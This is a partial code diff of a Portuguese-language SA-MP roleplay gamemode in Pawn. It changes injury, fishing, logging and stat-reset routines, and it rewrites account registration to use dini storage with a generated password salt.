                     RemovePlayerWeapon(playerid, arma);
-                    
+
                     SendClientMessage(playerid, COLOR_INFO, "Levaste um tiro no braço e largaste a tua arma");
 				}
             }
 			case BODY_PART_LEFT_LEG, BODY_PART_RIGHT_LEG:
 			{
 			    SendClientMessage(playerid, COLOR_INFO, "Levaste um tiro na perna e estás manco");
-			    
+
 			    ApplyAnimation(playerid, "SWEET", "Sweet_injuredloop", 4.0, 1, 0, 0, 0, 2000, 1);
 			}
 			case BODY_PART_HEAD: // headshot
 			{
-			    SetPlayerHealthEx(playerid, 0, 0);
+			    SetPlayerHealthEx(playerid, 0, HEALTH_SET);
 			}
         }
     }
-    
+
     return 1;
 }
 
@@ -10257,7 +10277,7 @@ public Pescar2(playerid, peixeid)
 	}
 
 	TogglePlayerControllable(playerid, 1);
-	SetTimerEx("PodePescar", 10000, false, "i", playerid);
+	SetPlayerTimer(playerid, "PodePescar", 10000, false);
 	RemovePlayerAttachedObject(playerid, CanaDePescaObjeto[playerid]);
 	RemovePlayerAttachedObject(playerid, 0);
 	ClearAnimations(playerid, 1);
@@ -10268,20 +10288,6 @@ public Pescar2(playerid, peixeid)
 
 public Pescar(playerid)
 {
-	/*
-	    probabilidades:
-
-	    não apanhar nada: 25%
-	    corvina: 15%
-	    robalo: 9%
-		sargo: 9%
-		goraz: 24%
-		cavala: 14%
-		dourada: 5%
-		espada: 7%
-		congro: 17%
-	*/
-
     new rand = random(132);
 
     switch(rand)
@@ -10290,11 +10296,9 @@ public Pescar(playerid)
         {
             PlayerActionMessage(playerid, 15.0, "repara que não apanhou nada.");
 			RemovePlayerAttachedObject(playerid, CanaDePescaObjeto[playerid]);
-			RemovePlayerAttachedObject(playerid, 0);
-			ClearAnimations(playerid, 1);
 			ClearAnimations(playerid, 1);
 			TogglePlayerControllable(playerid, 1);
-			SetTimerEx("PodePescar", 10000, false, "i", playerid);
+            SetPlayerTimer(playerid, "PodePescar", 10000, false);
         }
         case 26..35: // robalo
         {
@@ -10363,7 +10367,7 @@ public IncomingLog(playerid, ip[], port)
 	new string[64];
 	format(string, sizeof(string), "Incoming connection de %s:%d", ip, port);
 	WriteLog(LOG_INCOMING, string);
-	
+
 	return 1;
 }
 
@@ -10372,7 +10376,7 @@ public JoinLog(playerid)
 	new string[64];
 	new IP[16];
 	GetPlayerIp(playerid, IP, sizeof(IP));
-	
+
 	format(string, sizeof(string), "%s entrou no servidor. [%s]", GetPlayerNameEx(playerid), IP);
 	WriteLog(LOG_JOIN, string);
 
@@ -10387,7 +10391,7 @@ public HackLog(playerid, str[])
 
 	format(string, sizeof(string), "%s usou %s [%s]", GetPlayerNameEx(playerid), str, IP);
 	WriteLog(LOG_HACK, string);
-	
+
 	return 1;
 }
 
@@ -10403,11 +10407,18 @@ public BanLog(playerid, kickedby[MAX_PLAYER_NAME], str[])
 	return 1;
 }
 
-public ChatLog(playerid, msg[])
+public ChatLog(playerid, msg[], bool: ooc)
 {
 	new string[128];
 
-	format(string, sizeof(string), "%s disse: %s", GetPlayerNameEx(playerid), msg);
+	if(ooc == false)
+	{
+	    format(string, sizeof(string), "%s disse: %s", GetPlayerNameEx(playerid), msg);
+	}
+	else
+	{
+		format(string, sizeof(string), "(OOC) %s disse: %s", GetPlayerNameEx(playerid), msg);
+	}
 
 	WriteLog(LOG_CHAT, string);
 
@@ -10430,8 +10441,8 @@ public CMDLog(playerid, cmd[])
 	new string[128];
 
 	format(string, sizeof(string), "%s usou [ %s ]", GetPlayerNameEx(playerid), cmd);
-	
- 	if(strfind(cmd, "/entrar", true) == -1 && strfind(cmd, "/sair", true) == -1 && strfind(cmd, "/motor", true) == -1 && strfind(cmd, "/luzes", true) == -1 && strfind(cmd, "/portapsp", true) == -1 && strfind(cmd, "/garagempsp", true) == -1)
+
+ 	if(strfind(cmd, "entrar", true) == -1 && strfind(cmd, "sair", true) == -1 && strfind(cmd, "motor", true) == -1 && strfind(cmd, "luzes", true) == -1 && strfind(cmd, "portapsp", true) == -1 && strfind(cmd, "garagempsp", true) == -1 && strfind(cmd, "b", true) == -1)
     {
         WriteLog(LOG_CMDS, string);
 	}
@@ -10538,7 +10549,7 @@ public ResetStats(playerid)
 	pInfo[playerid][NumeroTelemovel] = 0;
 	pInfo[playerid][Rede] = 0;
 	pInfo[playerid][Saldo] = 0;
-	
+
     pObjects[playerid][Mala] = 0;
     pObjects[playerid][Mochila] = 0;
     pObjects[playerid][Arma1Mala] = 0;
@@ -10549,7 +10560,7 @@ public ResetStats(playerid)
     pObjects[playerid][Ammo3Mala] = 0;
     pObjects[playerid][Arma4Mala] = 0;
     pObjects[playerid][Ammo4Mala] = 0;
-    
+
     pObjects[playerid][Telemovel] = 0;
     pObjects[playerid][o_2054] = 0;
     pObjects[playerid][o_18639] = 0;
@@ -10590,7 +10601,7 @@ public ResetStats(playerid)
     pObjects[playerid][Venda] = 0;
     pObjects[playerid][Capacete] = 0;
     pObjects[playerid][CanaDePesca] = 0;
-    
+
 	Logged[playerid] = false;
  	AdminDuty[playerid] = false;
  	Algemado[playerid] = false;
@@ -10625,8 +10636,7 @@ public ResetStats(playerid)
 	FirstSpawn[playerid] = false;
 	Emergencia[playerid] = false;
 	Cinto[playerid] = false;
-	
- 	CustoMulta[playerid] = 0;
+
  	MultadorID[playerid] = 0;
  	AntiSpamAC[playerid] = 0;
  	DrugEffectCounter[playerid] = 0;
@@ -10649,7 +10659,7 @@ public ResetStats(playerid)
 	ConsultadorID[playerid] = 0;
 	EntrevistadorID[playerid] = INVALID_PLAYER_ID;
 	DrunkLevel[playerid] = 0;
-	TransferirPara[playerid] = 0;
+	TransferirPara[playerid] = INVALID_PLAYER_ID;
 	SpeedWarning[playerid] = 0;
 	TimerGuardarJogador[playerid] = -1;
 	BadLoginCounter[playerid] = 0;
@@ -10665,313 +10675,311 @@ public ResetStats(playerid)
 public AfterTutorial(playerid)
 {
     CleanChat(playerid);
-    
+
 	if(pInfo[playerid][Registado] == 0)
 	{
 		pInfo[playerid][Registado] = 1;
 		pInfo[playerid][TutFeito] = 1;
 		FirstSpawn[playerid] = true;
-		
+
 		GuardarJogador(playerid);
 	    SpawnarJogador(playerid);
-	    
+
 	    if(pInfo[playerid][TutFalhado] >= 3)
 	    {
 			new string[128];
-			
-		    foreach(new i : Player)
-		    {
-				if(AdminDuty[i] == false) continue;
 
-				format(string, sizeof(string), "[TUTORIAIS:] {FFFFFF}O jogador %s (ID:%d) passou no tutorial, mas errou %d vezes antes de conseguir.", GetPlayerNameEx(playerid), playerid, pInfo[playerid][TutFalhado]);
-				SendClientMessage(i, COLOR_OWNER, string);
-		    }
+			format(string, sizeof(string), "[TUTORIAIS:] {FFFFFF}O jogador %s (ID:%d) passou no tutorial, mas errou %d vezes antes de conseguir.", GetPlayerNameEx(playerid), playerid, pInfo[playerid][TutFalhado]);
+			SendAdminMessage(string);
 	    }
-	    
+
 	    SendClientMessage(playerid, COLOR_INFO, "[INFORMAÇÃO:] {FFFFFF}Parabéns por passares no questionário!");
 	    SendClientMessage(playerid, COLOR_INFO, "[INFORMAÇÃO:] {FFFFFF}Aconselhamos-te a ir tirar a carta! O local da escola de condução está marcado no teu mini-mapa. Bom jogo!");
-	    
+
 	    SetPlayerCheckpoint(playerid, 1448.6649, -1585.6483, 13.5469, 5.0);
 	}
-	
+
 	return 1;
 }
 
 public RegistarJogador(playerid, password[])
 {
     oInfo[0][RegistoCounter]++;
-    
+
 	new ficheiro[64];
  	new pw[256], cryptedpw[256];
 	new name[MAX_PLAYER_NAME];
-	
+	new CurrentDate[32];
+
+	format(CurrentDate, sizeof(CurrentDate), "%s", GetDate());
+
     GetPlayerName(playerid, name, sizeof(name));
     strmid(pw, password, 0, 256);
     format(ficheiro, sizeof(ficheiro), "PCRP/Contas/%s.ini", name);
 
-	SHA256_PassHash(pw, PW_SALT, cryptedpw, sizeof cryptedpw);
+    printf("Salt: %s", GeneratePasswordSalt(oInfo[0][RegistoCounter], CurrentDate));
 
-    DOF2_CreateFile(ficheiro);
-    
-    DOF2_SetString(ficheiro, "Key", cryptedpw);
-    DOF2_SetInt(ficheiro, "Banido", 0);
-    DOF2_SetInt(ficheiro, "UID", oInfo[0][RegistoCounter]);
-    DOF2_SetFloat(ficheiro, "Vida", 50);
-    DOF2_SetInt(ficheiro, "Level", 1);
-    DOF2_SetInt(ficheiro, "Skin", 6);
-    DOF2_SetInt(ficheiro, "Admin", 0);
-    DOF2_SetInt(ficheiro, "Emprego", 0);
-    DOF2_SetInt(ficheiro, "Faction", 0);
-    DOF2_SetInt(ficheiro, "FactionRank", 0);
-    DOF2_SetInt(ficheiro, "AJCounter", 0);
-    DOF2_SetString(ficheiro, "RegDay", GetDate());
-    DOF2_SetInt(ficheiro, "Origem", 0);
-    DOF2_SetInt(ficheiro, "Sexo", 0);
-    DOF2_SetInt(ficheiro, "Idade", 0);
-    DOF2_SetInt(ficheiro, "Registado",0);
-    DOF2_SetInt(ficheiro, "TutFeito", 0);
-    DOF2_SetInt(ficheiro, "Money", 2500);
-    DOF2_SetInt(ficheiro, "Bank", 0);
-    DOF2_SetInt(ficheiro, "ChaveBiz", 0);
-    DOF2_SetInt(ficheiro, "ChaveCasa", 0);
-    DOF2_SetInt(ficheiro, "ChaveCasaAlugada", 0);
-    DOF2_SetInt(ficheiro, "ChaveCarro1", 0);
-    DOF2_SetInt(ficheiro, "ChaveCarro2", 0);
-    DOF2_SetInt(ficheiro, "ChaveCarro3", 0);
-    DOF2_SetInt(ficheiro, "ChaveCarro4", 0);
-    DOF2_SetInt(ficheiro, "ChaveCarroEmp1", 0);
-    DOF2_SetInt(ficheiro, "ChaveCarroEmp2", 0);
-    DOF2_SetInt(ficheiro, "ChaveCarroEmp3", 0);
-    DOF2_SetInt(ficheiro, "ChaveCarroEmp4", 0);
-    DOF2_SetInt(ficheiro, "Minutos", 0);
-    DOF2_SetInt(ficheiro, "PreDrogas", 0);
-    DOF2_SetInt(ficheiro, "PreMateriais", 0);
-    DOF2_SetInt(ficheiro, "Drogas", 0);
-    DOF2_SetInt(ficheiro, "Materiais", 0);
-    DOF2_SetInt(ficheiro, "CartaLig", 0);
-    DOF2_SetInt(ficheiro, "CartaMota", 0);
-    DOF2_SetInt(ficheiro, "CartaPesados", 0);
-    DOF2_SetInt(ficheiro, "CartaBarco", 0);
-    DOF2_SetInt(ficheiro, "LicArmas", 0);
-    DOF2_SetInt(ficheiro, "Multas", 0);
-    DOF2_SetInt(ficheiro, "Jailed", 0);
-	DOF2_SetInt(ficheiro, "JailTime", 0);
-    DOF2_SetInt(ficheiro, "Preso", 0);
-	DOF2_SetInt(ficheiro, "PresoTempo", 0);
-    DOF2_SetInt(ficheiro, "XP", 0);
-	DOF2_SetInt(ficheiro, "Meses", 0);
-	DOF2_SetInt(ficheiro, "Doenca", 0);
-	DOF2_SetInt(ficheiro, "Medicamentos", 0);
-	DOF2_SetInt(ficheiro, "MedicamentosTomados", 0);
-	DOF2_SetInt(ficheiro, "ReceitaMedica", 0);
-	DOF2_SetInt(ficheiro, "Morto", 0);
-	DOF2_SetFloat(ficheiro, "MorteX", 0);
-	DOF2_SetFloat(ficheiro, "MorteY", 0);
-	DOF2_SetFloat(ficheiro, "MorteZ", 0);
-	DOF2_SetInt(ficheiro, "MorteVirtualWorld", 0);
-	DOF2_SetInt(ficheiro, "MorteInterior", 0);
-	DOF2_SetInt(ficheiro, "Euro1", 0);
-	DOF2_SetInt(ficheiro, "Euro2", 0);
-	DOF2_SetInt(ficheiro, "Euro3", 0);
-	DOF2_SetInt(ficheiro, "Euro4", 0);
-	DOF2_SetInt(ficheiro, "Euro5", 0);
-	DOF2_SetInt(ficheiro, "BilheteEuro", 0);
-	DOF2_SetInt(ficheiro, "Estrela1", 0);
-	DOF2_SetInt(ficheiro, "Estrela2", 0);
-	DOF2_SetInt(ficheiro, "Codigo", 0);
-	DOF2_SetInt(ficheiro, "Rotas", 0);
-	DOF2_SetInt(ficheiro, "EmpregoNivel", 0);
-	DOF2_SetInt(ficheiro, "TempoRota", 0);
-	DOF2_SetInt(ficheiro, "CC", -1);
-	DOF2_SetInt(ficheiro, "Seguradora", 0);
-	DOF2_SetInt(ficheiro, "MensalidadeSeguradora", 0);
-	DOF2_SetInt(ficheiro, "SeguradoraCount", 0);
-    DOF2_SetInt(ficheiro, "SeguradoraPayCount", 0);
-    DOF2_SetInt(ficheiro, "Golds", 0);
-	DOF2_SetInt(ficheiro, "Viciado", 0);
-	DOF2_SetInt(ficheiro, "TempoViciado", 0);
-	DOF2_SetInt(ficheiro, "ADesentoxicar", 0);
-	DOF2_SetInt(ficheiro, "NumeroTelemovel", 0);
-	DOF2_SetInt(ficheiro, "Rede", 0);
-	DOF2_SetInt(ficheiro, "Saldo", 0);
-	DOF2_SetInt(ficheiro, "TutFalhado", 0);
-	DOF2_SetInt(ficheiro, "LicPesca", 0);
-	DOF2_SetInt(ficheiro, "Colete", 0);
-	DOF2_SetFloat(ficheiro, "SpawnX", 0);
-	DOF2_SetFloat(ficheiro, "SpawnY", 0);
-	DOF2_SetFloat(ficheiro, "SpawnZ", 0);
-	DOF2_SetInt(ficheiro, "SpawnVirtualWorld", 0);
-	DOF2_SetInt(ficheiro, "SpawnInterior", 0);
-	DOF2_SetInt(ficheiro, "Suspeito", 0);
-	DOF2_SetInt(ficheiro, "VezesSuspeito", 0);
-	DOF2_SetInt(ficheiro, "VezesPreso", 0);
-    
-    DOF2_SaveFile();
-    
+	SHA256_PassHash(pw, GeneratePasswordSalt(oInfo[0][RegistoCounter], CurrentDate), cryptedpw, sizeof cryptedpw);
+
+    dini_Create(ficheiro);
+
+    dini_Set(ficheiro, "Key", cryptedpw);
+    dini_IntSet(ficheiro, "Banido", 0);
+    dini_IntSet(ficheiro, "UID", oInfo[0][RegistoCounter]);
+    dini_FloatSet(ficheiro, "Vida", 50);
+    dini_IntSet(ficheiro, "Level", 1);
+    dini_IntSet(ficheiro, "Skin", 6);
+    dini_IntSet(ficheiro, "Admin", 0);
+    dini_IntSet(ficheiro, "Emprego", 0);
+    dini_IntSet(ficheiro, "Faction", 0);
+    dini_IntSet(ficheiro, "FactionRank", 0);
+    dini_IntSet(ficheiro, "AJCounter", 0);
+    dini_Set(ficheiro, "RegDay", CurrentDate);
+    dini_IntSet(ficheiro, "Origem", 0);
+    dini_IntSet(ficheiro, "Sexo", 0);
+    dini_IntSet(ficheiro, "Idade", 0);
+    dini_IntSet(ficheiro, "Registado",0);
+    dini_IntSet(ficheiro, "TutFeito", 0);
+    dini_IntSet(ficheiro, "Money", 2500);
+    dini_IntSet(ficheiro, "Bank", 0);
+    dini_IntSet(ficheiro, "ChaveBiz", 0);
+    dini_IntSet(ficheiro, "ChaveCasa", 0);
+    dini_IntSet(ficheiro, "ChaveCasaAlugada", 0);
+    dini_IntSet(ficheiro, "ChaveCarro1", 0);
+    dini_IntSet(ficheiro, "ChaveCarro2", 0);
+    dini_IntSet(ficheiro, "ChaveCarro3", 0);
+    dini_IntSet(ficheiro, "ChaveCarro4", 0);
+    dini_IntSet(ficheiro, "ChaveCarroEmp1", 0);
+    dini_IntSet(ficheiro, "ChaveCarroEmp2", 0);
+    dini_IntSet(ficheiro, "ChaveCarroEmp3", 0);
+    dini_IntSet(ficheiro, "ChaveCarroEmp4", 0);
+    dini_IntSet(ficheiro, "Minutos", 0);
+    dini_IntSet(ficheiro, "PreDrogas", 0);
+    dini_IntSet(ficheiro, "PreMateriais", 0);
+    dini_IntSet(ficheiro, "Drogas", 0);
+    dini_IntSet(ficheiro, "Materiais", 0);
+    dini_IntSet(ficheiro, "CartaLig", 0);
+    dini_IntSet(ficheiro, "CartaMota", 0);
+    dini_IntSet(ficheiro, "CartaPesados", 0);
+    dini_IntSet(ficheiro, "CartaBarco", 0);
+    dini_IntSet(ficheiro, "LicArmas", 0);
+    dini_IntSet(ficheiro, "Multas", 0);
+    dini_IntSet(ficheiro, "Jailed", 0);
+	dini_IntSet(ficheiro, "JailTime", 0);
+    dini_IntSet(ficheiro, "Preso", 0);
+	dini_IntSet(ficheiro, "PresoTempo", 0);
+    dini_IntSet(ficheiro, "XP", 0);
+	dini_IntSet(ficheiro, "Meses", 0);
+	dini_IntSet(ficheiro, "Doenca", 0);
+	dini_IntSet(ficheiro, "Medicamentos", 0);
+	dini_IntSet(ficheiro, "MedicamentosTomados", 0);
+	dini_IntSet(ficheiro, "ReceitaMedica", 0);
+	dini_IntSet(ficheiro, "Morto", 0);
+	dini_FloatSet(ficheiro, "MorteX", 0);
+	dini_FloatSet(ficheiro, "MorteY", 0);
+	dini_FloatSet(ficheiro, "MorteZ", 0);
+	dini_IntSet(ficheiro, "MorteVirtualWorld", 0);
+	dini_IntSet(ficheiro, "MorteInterior", 0);
+	dini_IntSet(ficheiro, "Euro1", 0);
+	dini_IntSet(ficheiro, "Euro2", 0);
+	dini_IntSet(ficheiro, "Euro3", 0);
+	dini_IntSet(ficheiro, "Euro4", 0);
+	dini_IntSet(ficheiro, "Euro5", 0);
+	dini_IntSet(ficheiro, "BilheteEuro", 0);
+	dini_IntSet(ficheiro, "Estrela1", 0);
+	dini_IntSet(ficheiro, "Estrela2", 0);
+	dini_IntSet(ficheiro, "Codigo", 0);
+	dini_IntSet(ficheiro, "Rotas", 0);
+	dini_IntSet(ficheiro, "EmpregoNivel", 0);
+	dini_IntSet(ficheiro, "TempoRota", 0);
+	dini_IntSet(ficheiro, "CC", -1);
+	dini_IntSet(ficheiro, "Seguradora", 0);
+	dini_IntSet(ficheiro, "MensalidadeSeguradora", 0);
+	dini_IntSet(ficheiro, "SeguradoraCount", 0);
+    dini_IntSet(ficheiro, "SeguradoraPayCount", 0);
+    dini_IntSet(ficheiro, "Golds", 0);
+	dini_IntSet(ficheiro, "Viciado", 0);
+	dini_IntSet(ficheiro, "TempoViciado", 0);
+	dini_IntSet(ficheiro, "ADesentoxicar", 0);
+	dini_IntSet(ficheiro, "NumeroTelemovel", 0);
+	dini_IntSet(ficheiro, "Rede", 0);
+	dini_IntSet(ficheiro, "Saldo", 0);
+	dini_IntSet(ficheiro, "TutFalhado", 0);
+	dini_IntSet(ficheiro, "LicPesca", 0);
+	dini_IntSet(ficheiro, "Colete", 0);
+	dini_FloatSet(ficheiro, "SpawnX", 0);
+	dini_FloatSet(ficheiro, "SpawnY", 0);
+	dini_FloatSet(ficheiro, "SpawnZ", 0);
+	dini_IntSet(ficheiro, "SpawnVirtualWorld", 0);
+	dini_IntSet(ficheiro, "SpawnInterior", 0);
+	dini_IntSet(ficheiro, "Crashou", 0);
+	dini_IntSet(ficheiro, "Suspeito", 0);
+	dini_IntSet(ficheiro, "VezesSuspeito", 0);
+	dini_IntSet(ficheiro, "VezesPreso", 0);
+	dini_IntSet(ficheiro, "Kicks", 0);
+
     pInfo[playerid][Key] = cryptedpw;
-    pInfo[playerid][Banido] = DOF2_GetInt(ficheiro, "Banido");
-    pInfo[playerid][UID] = DOF2_GetInt(ficheiro, "UID");
-    pInfo[playerid][Vida] = DOF2_GetFloat(ficheiro, "Vida");
-    pInfo[playerid][Level] = DOF2_GetInt(ficheiro, "Level");
-    pInfo[playerid][Skin] = DOF2_GetInt(ficheiro, "Skin");
-    pInfo[playerid][Admin] = DOF2_GetInt(ficheiro, "Admin");
-    pInfo[playerid][Emprego] = DOF2_GetInt(ficheiro, "Emprego");
-    pInfo[playerid][Faction] = DOF2_GetInt(ficheiro, "Faction");
-    pInfo[playerid][FactionRank] = DOF2_GetInt(ficheiro, "FactionRank");
-    pInfo[playerid][AJCounter] = DOF2_GetInt(ficheiro, "AJCounter");
-    format(pInfo[playerid][RegDay], 32, "%s", DOF2_GetString(ficheiro, "RegDay"));
-    pInfo[playerid][Origem] = DOF2_GetInt(ficheiro, "Origem");
-    pInfo[playerid][Sexo] = DOF2_GetInt(ficheiro, "Sexo");
-    pInfo[playerid][Idade] = DOF2_GetInt(ficheiro, "Idade");
-	pInfo[playerid][Registado] = DOF2_GetInt(ficheiro, "Registado");
-	pInfo[playerid][TutFeito] = DOF2_GetInt(ficheiro, "TutFeito");
-	pInfo[playerid][Money] = DOF2_GetInt(ficheiro, "Money");
-	pInfo[playerid][Bank] = DOF2_GetInt(ficheiro, "Bank");
-	pInfo[playerid][ChaveBiz] = DOF2_GetInt(ficheiro, "ChaveBiz");
-	pInfo[playerid][ChaveCasa] = DOF2_GetInt(ficheiro, "ChaveCasa");
-	pInfo[playerid][ChaveCasaAlugada] = DOF2_GetInt(ficheiro, "ChaveCasaAlugada");
-	pInfo[playerid][ChaveCarro1] = DOF2_GetInt(ficheiro, "ChaveCarro1");
-	pInfo[playerid][ChaveCarro2] = DOF2_GetInt(ficheiro, "ChaveCarro2");
-	pInfo[playerid][ChaveCarro3] = DOF2_GetInt(ficheiro, "ChaveCarro3");
-	pInfo[playerid][ChaveCarro4] = DOF2_GetInt(ficheiro, "ChaveCarro4");
-	pInfo[playerid][ChaveCarroEmp1] = DOF2_GetInt(ficheiro, "ChaveCarroEmp1");
-	pInfo[playerid][ChaveCarroEmp2] = DOF2_GetInt(ficheiro, "ChaveCarroEmp2");
-	pInfo[playerid][ChaveCarroEmp3] = DOF2_GetInt(ficheiro, "ChaveCarroEmp3");
-	pInfo[playerid][ChaveCarroEmp4] = DOF2_GetInt(ficheiro, "ChaveCarroEmp4");
-	pInfo[playerid][Minutos] = DOF2_GetInt(ficheiro, "Minutos");
-	pInfo[playerid][PreDrogas] = DOF2_GetInt(ficheiro, "PreDrogas");
-	pInfo[playerid][PreMateriais] = DOF2_GetInt(ficheiro, "PreMateriais");
-	pInfo[playerid][Drogas] = DOF2_GetInt(ficheiro, "Drogas");
-	pInfo[playerid][Materiais] = DOF2_GetInt(ficheiro, "Materiais");
-	pInfo[playerid][CartaLig] = DOF2_GetInt(ficheiro, "CartaLig");
-	pInfo[playerid][CartaMota] = DOF2_GetInt(ficheiro, "CartaMota");
-	pInfo[playerid][CartaPesados] = DOF2_GetInt(ficheiro, "CartaPesados");
-	pInfo[playerid][CartaBarco] = DOF2_GetInt(ficheiro, "CartaBarco");
-	pInfo[playerid][LicArmas] = DOF2_GetInt(ficheiro, "LicArmas");
-	pInfo[playerid][Multas] = DOF2_GetInt(ficheiro, "Multas");
-	pInfo[playerid][Jailed] = DOF2_GetInt(ficheiro, "Jailed");
-	pInfo[playerid][JailTime] = DOF2_GetInt(ficheiro, "JailTime");
-	pInfo[playerid][Preso] = DOF2_GetInt(ficheiro, "Preso");
-	pInfo[playerid][PresoTempo] = DOF2_GetInt(ficheiro, "PresoTempo");
-	pInfo[playerid][Preso] = DOF2_GetInt(ficheiro, "XP");
-	pInfo[playerid][PresoTempo] = DOF2_GetInt(ficheiro, "Meses");
-	pInfo[playerid][Doenca] = DOF2_GetInt(ficheiro, "Doenca");
-	pInfo[playerid][Medicamentos] = DOF2_GetInt(ficheiro, "Medicamentos");
-	pInfo[playerid][MedicamentosTomados] = DOF2_GetInt(ficheiro, "MedicamentosTomados");
-	pInfo[playerid][ReceitaMedica] = DOF2_GetInt(ficheiro, "ReceitaMedica");
-	pInfo[playerid][Morto] = DOF2_GetInt(ficheiro, "Morto");
-	pInfo[playerid][MorteX] = DOF2_GetFloat(ficheiro, "MorteX");
-	pInfo[playerid][MorteY] = DOF2_GetFloat(ficheiro, "MorteY");
-	pInfo[playerid][MorteZ] = DOF2_GetFloat(ficheiro, "MorteZ");
-	pInfo[playerid][MorteVirtualWorld] = DOF2_GetInt(ficheiro, "MorteVirtualWorld");
-	pInfo[playerid][MorteInterior] = DOF2_GetInt(ficheiro, "MorteInterior");
-	pInfo[playerid][Euro1] = DOF2_GetInt(ficheiro, "Euro1");
-	pInfo[playerid][Euro2] = DOF2_GetInt(ficheiro, "Euro2");
-	pInfo[playerid][Euro3] = DOF2_GetInt(ficheiro, "Euro3");
-	pInfo[playerid][Euro4] = DOF2_GetInt(ficheiro, "Euro4");
-	pInfo[playerid][Euro5] = DOF2_GetInt(ficheiro, "Euro5");
-	pInfo[playerid][BilheteEuro] = DOF2_GetInt(ficheiro, "BilheteEuro");
-	pInfo[playerid][Estrela1] = DOF2_GetInt(ficheiro, "Estrela1");
-	pInfo[playerid][Estrela2] = DOF2_GetInt(ficheiro, "Estrela2");
-	pInfo[playerid][Codigo] = DOF2_GetInt(ficheiro, "Codigo");
-	pInfo[playerid][Rotas] = DOF2_GetInt(ficheiro, "Rotas");
-	pInfo[playerid][EmpregoNivel] = DOF2_GetInt(ficheiro, "EmpregoNivel");
-	pInfo[playerid][TempoRota] = DOF2_GetInt(ficheiro, "TempoRota");
-	pInfo[playerid][CC] = DOF2_GetInt(ficheiro, "CC");
-	pInfo[playerid][Seguradora] = DOF2_GetInt(ficheiro, "Seguradora");
-	pInfo[playerid][MensalidadeSeguradora] = DOF2_GetInt(ficheiro, "MensalidadeSeguradora");
-	pInfo[playerid][SeguradoraCount] = DOF2_GetInt(ficheiro, "SeguradoraCount");
-	pInfo[playerid][SeguradoraPayCount] = DOF2_GetInt(ficheiro, "SeguradoraPayCount");
-	pInfo[playerid][Golds] = DOF2_GetInt(ficheiro, "Golds");
-	pInfo[playerid][Viciado] = DOF2_GetInt(ficheiro, "Viciado");
-	pInfo[playerid][TempoViciado] = DOF2_GetInt(ficheiro, "TempoViciado");
-	pInfo[playerid][ADesentoxicar] = DOF2_GetInt(ficheiro, "ADesentoxicar");
-	pInfo[playerid][NumeroTelemovel] = DOF2_GetInt(ficheiro, "NumeroTelemovel");
-	pInfo[playerid][Rede] = DOF2_GetInt(ficheiro, "Rede");
-	pInfo[playerid][Saldo] = DOF2_GetInt(ficheiro, "Saldo");
-	pInfo[playerid][TutFalhado] = DOF2_GetInt(ficheiro, "TutFalhado");
-	pInfo[playerid][LicPesca] = DOF2_GetInt(ficheiro, "LicPesca");
-	pInfo[playerid][Colete] = DOF2_GetInt(ficheiro, "Colete");
-	pInfo[playerid][Suspeito] = DOF2_GetInt(ficheiro, "Suspeito");
-	pInfo[playerid][VezesSuspeito] = DOF2_GetInt(ficheiro, "VezesSuspeito");
-	pInfo[playerid][VezesPreso] = DOF2_GetInt(ficheiro, "VezesPreso");
-	
+    pInfo[playerid][Banido] = dini_Int(ficheiro, "Banido");
+    pInfo[playerid][UID] = dini_Int(ficheiro, "UID");
+    pInfo[playerid][Vida] = dini_Float(ficheiro, "Vida");
+    pInfo[playerid][Level] = dini_Int(ficheiro, "Level");
+    pInfo[playerid][Skin] = dini_Int(ficheiro, "Skin");
+    pInfo[playerid][Admin] = dini_Int(ficheiro, "Admin");
+    pInfo[playerid][Emprego] = dini_Int(ficheiro, "Emprego");
+    pInfo[playerid][Faction] = dini_Int(ficheiro, "Faction");
+    pInfo[playerid][FactionRank] = dini_Int(ficheiro, "FactionRank");
+    pInfo[playerid][AJCounter] = dini_Int(ficheiro, "AJCounter");
+    format(pInfo[playerid][RegDay], 32, "%s", dini_Get(ficheiro, "RegDay"));
+    pInfo[playerid][Origem] = dini_Int(ficheiro, "Origem");
+    pInfo[playerid][Sexo] = dini_Int(ficheiro, "Sexo");
+    pInfo[playerid][Idade] = dini_Int(ficheiro, "Idade");
+	pInfo[playerid][Registado] = dini_Int(ficheiro, "Registado");
+	pInfo[playerid][TutFeito] = dini_Int(ficheiro, "TutFeito");
+	pInfo[playerid][Money] = dini_Int(ficheiro, "Money");
+	pInfo[playerid][Bank] = dini_Int(ficheiro, "Bank");
+	pInfo[playerid][ChaveBiz] = dini_Int(ficheiro, "ChaveBiz");
+	pInfo[playerid][ChaveCasa] = dini_Int(ficheiro, "ChaveCasa");
+	pInfo[playerid][ChaveCasaAlugada] = dini_Int(ficheiro, "ChaveCasaAlugada");
+	pInfo[playerid][ChaveCarro1] = dini_Int(ficheiro, "ChaveCarro1");
+	pInfo[playerid][ChaveCarro2] = dini_Int(ficheiro, "ChaveCarro2");
+	pInfo[playerid][ChaveCarro3] = dini_Int(ficheiro, "ChaveCarro3");
+	pInfo[playerid][ChaveCarro4] = dini_Int(ficheiro, "ChaveCarro4");
+	pInfo[playerid][ChaveCarroEmp1] = dini_Int(ficheiro, "ChaveCarroEmp1");
+	pInfo[playerid][ChaveCarroEmp2] = dini_Int(ficheiro, "ChaveCarroEmp2");
+	pInfo[playerid][ChaveCarroEmp3] = dini_Int(ficheiro, "ChaveCarroEmp3");
+	pInfo[playerid][ChaveCarroEmp4] = dini_Int(ficheiro, "ChaveCarroEmp4");
+	pInfo[playerid][Minutos] = dini_Int(ficheiro, "Minutos");
+	pInfo[playerid][PreDrogas] = dini_Int(ficheiro, "PreDrogas");
+	pInfo[playerid][PreMateriais] = dini_Int(ficheiro, "PreMateriais");
+	pInfo[playerid][Drogas] = dini_Int(ficheiro, "Drogas");
+	pInfo[playerid][Materiais] = dini_Int(ficheiro, "Materiais");
+	pInfo[playerid][CartaLig] = dini_Int(ficheiro, "CartaLig");
+	pInfo[playerid][CartaMota] = dini_Int(ficheiro, "CartaMota");
+	pInfo[playerid][CartaPesados] = dini_Int(ficheiro, "CartaPesados");
+	pInfo[playerid][CartaBarco] = dini_Int(ficheiro, "CartaBarco");
+	pInfo[playerid][LicArmas] = dini_Int(ficheiro, "LicArmas");
+	pInfo[playerid][Multas] = dini_Int(ficheiro, "Multas");
+	pInfo[playerid][Jailed] = dini_Int(ficheiro, "Jailed");
+	pInfo[playerid][JailTime] = dini_Int(ficheiro, "JailTime");
+	pInfo[playerid][Preso] = dini_Int(ficheiro, "Preso");
+	pInfo[playerid][PresoTempo] = dini_Int(ficheiro, "PresoTempo");
+	pInfo[playerid][Preso] = dini_Int(ficheiro, "XP");
+	pInfo[playerid][PresoTempo] = dini_Int(ficheiro, "Meses");
+	pInfo[playerid][Doenca] = dini_Int(ficheiro, "Doenca");
